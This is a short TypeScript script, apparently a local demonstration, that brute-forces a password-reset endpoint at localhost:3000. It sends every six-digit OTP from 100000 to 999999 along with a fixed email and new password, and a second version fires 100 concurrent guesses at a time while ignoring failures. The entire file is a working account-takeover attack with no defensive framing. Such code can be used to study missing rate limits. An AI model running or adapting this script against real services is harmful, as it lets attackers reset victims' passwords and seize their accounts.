import axios from "axios";

async function sendRequest(otp: string) {
  let data = {
    "email": "1@2.com",
    "otp": otp,
    "newPassword": "123123123"
  };

  let config = {
    method: 'post',
    maxBodyLength: Infinity,
    headers: {
      'Content-Type': 'application/json'
    },
    url: 'http://localhost:3000/reset-password',
    data: data
  };

  try {
    await axios.request(config)
    console.log("done for " + otp);
  } catch(e) {
    
  }
}

async function main() {
  for (let i = 100000; i < 1000000; i++) {
    console.log("here for " + i);
    await sendRequest(i.toString());
  }

}

async function main2() {
  for (let i = 100000; i < 1000000; i+=100) { 
    const promises = [];
    console.log("here for " + i);
    for (let j = 0; j < 100; j++) {
      promises.push(sendRequest((i + j).toString()))
    }
    await Promise.all(promises);
    // console.log(promises);
    
  }

}

main2()